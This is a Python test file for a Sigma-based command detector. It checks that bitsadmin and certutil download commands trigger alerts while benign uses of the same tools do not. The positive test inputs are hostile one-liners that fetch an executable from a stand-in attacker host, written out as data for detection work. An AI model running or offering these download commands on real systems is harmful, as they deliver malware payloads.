"""Native equivalents preserve the verified SigmaHQ command conditions."""

from __future__ import annotations

from datetime import datetime, timedelta

from eventiq.config import SigmaCommandConfig
from eventiq.detectors.sigma_commands import SigmaCommandDetector
from eventiq.model import Event


def _event(log_id: str, command: str, offset: int = 0) -> Event:
    return Event(
        log_id=log_id,
        timestamp=datetime(2026, 7, 1) + timedelta(seconds=offset),
        srcip="10.0.0.5",
        dstip="10.0.0.6",
        srcport=None,
        dstport=None,
        protocol="",
        service="",
        srcuser="",
        status="",
        domain="",
        command=command,
        bytes_sent=0,
        bytes_received=0,
    )


def test_bitsadmin_and_certutil_downloads_fire_without_broad_utility_matches() -> None:
    det = SigmaCommandDetector(SigmaCommandConfig())
    commands = {
        "bits-positive": "bitsadmin /transfer job http://evil.test/a.exe C:\\a.exe",
        "bits-negative": "bitsadmin /list /allusers",
        "cert-positive": "certutil.exe -urlcache -split -f http://evil.test/a a.exe",
        "cert-negative": "certutil.exe -hashfile C:\\safe.exe SHA256",
    }
    for i, (log_id, command) in enumerate(commands.items()):
        det.feed(_event(log_id, command, i))
    alerts = det.finalize()
    by_rule = {alert.rule_id: alert for alert in alerts}
    assert by_rule[100700].match_ids == {"bits-positive"}
    assert by_rule[100710].match_ids == {"cert-positive"}

